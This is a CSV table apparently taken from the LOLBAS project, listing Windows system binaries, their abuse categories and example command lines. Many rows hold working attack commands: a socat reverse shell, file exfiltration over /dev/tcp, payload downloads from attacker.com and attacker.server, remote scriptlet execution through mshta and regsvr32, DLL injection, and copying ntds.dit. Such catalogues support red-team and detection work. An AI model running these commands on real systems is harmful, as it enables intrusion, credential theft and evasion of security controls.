Name,BInary_Link,Function,Code(s)
At.exe,https://lolbas-project.github.io/lolbas/Binaries/At/,[['Execute']],"['C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe']"
Atbroker.exe,https://lolbas-project.github.io/lolbas/Binaries/Atbroker/,[['Execute']],['ATBroker.exe /start malware']
Bash.exe,https://lolbas-project.github.io/lolbas/Binaries/Bash/,"[['Execute', 'AWL bypass']]","['bash.exe -c calc.exe', 'bash.exe -c ""socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane""', ""bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'"", 'bash.exe -c calc.exe']"
Bitsadmin.exe,https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,"[['Alternate data streams', 'Download', 'Copy', 'Execute']]","['bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1', 'bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1', 'bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset', 'bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset']"
CertReq.exe,https://lolbas-project.github.io/lolbas/Binaries/Certreq/,"[['Download', 'Upload']]","['CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt', 'CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal']"
Certutil.exe,https://lolbas-project.github.io/lolbas/Binaries/Certutil/,"[['Download', 'Alternate data streams', 'Encode', 'Decode']]","['certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe', 'certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt', 'certutil -encode inputFileName encodedOutputFileName', 'certutil -decode encodedInputFileName decodedOutputFileName']"
Cmd.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,[['Alternate data streams']],"['cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat', 'cmd.exe - < fakefile.doc:payload.bat']"
Cmdkey.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmdkey/,[['Credentials']],['cmdkey /list']
Cmstp.exe,https://lolbas-project.github.io/lolbas/Binaries/Cmstp/,"[['Execute', 'AWL bypass']]","['cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']"
Control.exe,https://lolbas-project.github.io/lolbas/Binaries/Control/,[['Alternate data streams']],['control.exe c:\\windows\\tasks\\file.txt:evil.dll']
Csc.exe,https://lolbas-project.github.io/lolbas/Binaries/Csc/,[['Compile']],"['csc.exe -out:My.exe File.cs', 'csc -target:library File.cs']"
Cscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Cscript/,[['Alternate data streams']],['cscript c:\\ads\\file.txt:script.vbs']
Desktopimgdownldr.exe,https://lolbas-project.github.io/lolbas/Binaries/Desktopimgdownldr/,[['Download']],"['set ""SYSTEMROOT=C:\\Windows\\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr']"
Dfsvc.exe,https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/,[['AWL bypass']],"['rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo']"
Diantz.exe,https://lolbas-project.github.io/lolbas/Binaries/Diantz/,"[['Alternate data streams', 'Download']]","['diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab', 'diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab']"
Diskshadow.exe,https://lolbas-project.github.io/lolbas/Binaries/Diskshadow/,"[['Dump', 'Execute']]","['diskshadow.exe /s c:\\test\\diskshadow.txt', 'diskshadow> exec calc.exe']"
Dnscmd.exe,https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/,[['Execute']],['dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll']
Esentutl.exe,https://lolbas-project.github.io/lolbas/Binaries/Esentutl/,"[['Copy', 'Alternate data streams', 'Download']]","['esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o', 'esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\folder\\ntds.dit', 'esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o', 'esentutl.exe /y C:\\ADS\\file.txt:file.exe /d c:\\ADS\\file.exe /o', 'esentutl.exe /y \\\\192.168.100.100\\webdav\\file.exe /d c:\\ADS\\file.txt:file.exe /o', 'esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o']"
Eventvwr.exe,https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/,[['UAC bypass']],['eventvwr.exe']
Expand.exe,https://lolbas-project.github.io/lolbas/Binaries/Expand/,"[['Download', 'Copy', 'Alternate data streams']]","['expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat', 'expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat', 'expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat']"
,https://lolbas-project.github.io/lolbas/Binaries/Explorer/,[[]],[]
Extexport.exe,https://lolbas-project.github.io/lolbas/Binaries/Extexport/,[['Execute']],['Extexport.exe c:\\test foo bar']
Extrac32.exe,https://lolbas-project.github.io/lolbas/Binaries/Extrac32/,"[['Alternate data streams', 'Download', 'Copy']]","['extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe', 'extrac32 \\\\webdavserver\\webdav\\file.cab c:\\ADS\\file.txt:file.exe', 'extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt', 'extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe']"
Findstr.exe,https://lolbas-project.github.io/lolbas/Binaries/Findstr/,"[['Alternate data streams', 'Credentials', 'Download']]","['findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe', 'findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.txt:file.exe', 'findstr /S /I cpassword \\\\sysvol\\policies\\*.xml', 'findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe']"
Forfiles.exe,https://lolbas-project.github.io/lolbas/Binaries/Forfiles/,"[['Execute', 'Alternate data streams']]","['forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe', 'forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""']"
Ftp.exe,https://lolbas-project.github.io/lolbas/Binaries/Ftp/,"[['Execute', 'Download']]","['echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt', 'cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""']"
GfxDownloadWrapper.exe,https://lolbas-project.github.io/lolbas/Binaries/GfxDownloadWrapper/,[['Download']],"['C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""']"
Gpscript.exe,https://lolbas-project.github.io/lolbas/Binaries/Gpscript/,[['Execute']],"['Gpscript /logon', 'Gpscript /startup']"
Hh.exe,https://lolbas-project.github.io/lolbas/Binaries/Hh/,"[['Download', 'Execute']]","['HH.exe http://some.url/script.ps1', 'HH.exe c:\\windows\\system32\\calc.exe']"
Ie4uinit.exe,https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/,[['Execute']],['ie4uinit.exe -BaseSettings']
Ieexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,"[['Download', 'Execute']]","['ieexec.exe http://x.x.x.x:8080/bypass.exe', 'ieexec.exe http://x.x.x.x:8080/bypass.exe']"
Ilasm.exe,https://lolbas-project.github.io/lolbas/Binaries/Ilasm/,[['Compile']],"['ilasm.exe C:\\public\\test.txt /exe', 'ilasm.exe C:\\public\\test.txt /dll']"
Infdefaultinstall.exe,https://lolbas-project.github.io/lolbas/Binaries/Infdefaultinstall/,[['Execute']],['InfDefaultInstall.exe Infdefaultinstall.inf']
Installutil.exe,https://lolbas-project.github.io/lolbas/Binaries/Installutil/,"[['AWL bypass', 'Execute']]","['InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll', 'InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll']"
Jsc.exe,https://lolbas-project.github.io/lolbas/Binaries/Jsc/,[['Compile']],"['jsc.exe scriptfile.js', 'jsc.exe /t:library Library.js']"
Makecab.exe,https://lolbas-project.github.io/lolbas/Binaries/Makecab/,"[['Alternate data streams', 'Download']]","['makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab', 'makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.txt:file.cab', 'makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab']"
Mavinject.exe,https://lolbas-project.github.io/lolbas/Binaries/Mavinject/,"[['Execute', 'Alternate data streams']]","['MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll', 'Mavinject.exe 4172 /INJECTRUNNING ""c:\\ads\\file.txt:file.dll""']"
Microsoft.Workflow.Compiler.exe,https://lolbas-project.github.io/lolbas/Binaries/Microsoft.Workflow.Compiler/,"[['Execute', 'AWL bypass']]","['Microsoft.Workflow.Compiler.exe tests.xml results.xml', 'Microsoft.Workflow.Compiler.exe tests.txt results.txt', 'Microsoft.Workflow.Compiler.exe tests.txt results.txt']"
Mmc.exe,https://lolbas-project.github.io/lolbas/Binaries/Mmc/,[['Execute']],['mmc.exe -Embedding c:\\path\\to\\test.msc']
MpCmdRun.exe,https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,"[['Download', 'Alternate data streams']]","['MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe', 'MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe']"
Msbuild.exe,https://lolbas-project.github.io/lolbas/Binaries/Msbuild/,"[['AWL bypass', 'Execute']]","['msbuild.exe pshell.xml', 'msbuild.exe project.csproj']"
Msconfig.exe,https://lolbas-project.github.io/lolbas/Binaries/Msconfig/,[['Execute']],['Msconfig.exe -5']
Msdt.exe,https://lolbas-project.github.io/lolbas/Binaries/Msdt/,"[['Execute', 'AWL bypass']]","['msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE', 'msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE']"
Mshta.exe,https://lolbas-project.github.io/lolbas/Binaries/Mshta/,"[['Execute', 'Alternate data streams']]","['mshta.exe evilfile.hta', 'mshta.exe vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))', 'mshta.exe javascript:a=GetObject(""script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct"").Exec();close();', 'mshta.exe ""C:\\ads\\file.txt:file.hta""']"
Msiexec.exe,https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,[['Execute']],"['msiexec /quiet /i cmd.msi', 'msiexec /q /i http://192.168.100.3/tmp/cmd.png', 'msiexec /y ""C:\\folder\\evil.dll""', 'msiexec /z ""C:\\folder\\evil.dll""']"
Netsh.exe,https://lolbas-project.github.io/lolbas/Binaries/Netsh/,[['Execute']],['netsh.exe add helper C:\\Users\\User\\file.dll']
Odbcconf.exe,https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/,[['Execute']],"['odbcconf -f file.rsp', 'odbcconf /a {REGSVR c:\\test\\test.dll}']"
Pcalua.exe,https://lolbas-project.github.io/lolbas/Binaries/Pcalua/,[['Execute']],"['pcalua.exe -a calc.exe', 'pcalua.exe -a \\\\server\\payload.dll', 'pcalua.exe -a C:\\Windows\\system32\\javacpl.cpl -c Java']"
Pcwrun.exe,https://lolbas-project.github.io/lolbas/Binaries/Pcwrun/,[['Execute']],['Pcwrun.exe c:\\temp\\beacon.exe']
Pktmon.exe,https://lolbas-project.github.io/lolbas/Binaries/Pktmon/,[['Reconnaissance']],"['pktmon.exe start --etw', 'pktmon.exe filter add -p 445']"
Presentationhost.exe,https://lolbas-project.github.io/lolbas/Binaries/Presentationhost/,[['Execute']],['Presentationhost.exe C:\\temp\\Evil.xbap']
Print.exe,https://lolbas-project.github.io/lolbas/Binaries/Print/,"[['Alternate data streams', 'Copy']]","['print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe', 'print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe', 'print /D:C:\\OutFolder\\outfile.exe \\\\WebDavServer\\Folder\\File.exe']"
Psr.exe,https://lolbas-project.github.io/lolbas/Binaries/Psr/,[['Reconnaissance']],['psr.exe /start /output D:\\test.zip /sc 1 /gui 0']
Rasautou.exe,https://lolbas-project.github.io/lolbas/Binaries/Rasautou/,[['Execute']],['rasautou -d powershell.dll -p powershell -a a -e e']
Reg.exe,https://lolbas-project.github.io/lolbas/Binaries/Reg/,[['Alternate data streams']],['reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg']
Regasm.exe,https://lolbas-project.github.io/lolbas/Binaries/Regasm/,"[['AWL bypass', 'Execute']]","['regasm.exe AllTheThingsx64.dll', 'regasm.exe /U AllTheThingsx64.dll']"
Regedit.exe,https://lolbas-project.github.io/lolbas/Binaries/Regedit/,[['Alternate data streams']],"['regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey', 'regedit C:\\ads\\file.txt:regfile.reg']"
Regini.exe,https://lolbas-project.github.io/lolbas/Binaries/Regini/,[['Alternate data streams']],['regini.exe newfile.txt:hidden.ini']
Register-cimprovider.exe,https://lolbas-project.github.io/lolbas/Binaries/Register-cimprovider/,[['Execute']],"['Register-cimprovider -path ""C:\\folder\\evil.dll""']"
Regsvcs.exe,https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/,"[['Execute', 'AWL bypass']]","['regsvcs.exe AllTheThingsx64.dll', 'regsvcs.exe AllTheThingsx64.dll']"
Regsvr32.exe,https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,"[['AWL bypass', 'Execute']]","['regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll', 'regsvr32.exe /s /u /i:file.sct scrobj.dll', 'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll', 'regsvr32.exe /s /u /i:file.sct scrobj.dll']"
Replace.exe,https://lolbas-project.github.io/lolbas/Binaries/Replace/,"[['Copy', 'Download']]","['replace.exe C:\\Source\\File.cab C:\\Destination /A', 'replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A']"
Rpcping.exe,https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,[['Credentials']],['rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM']
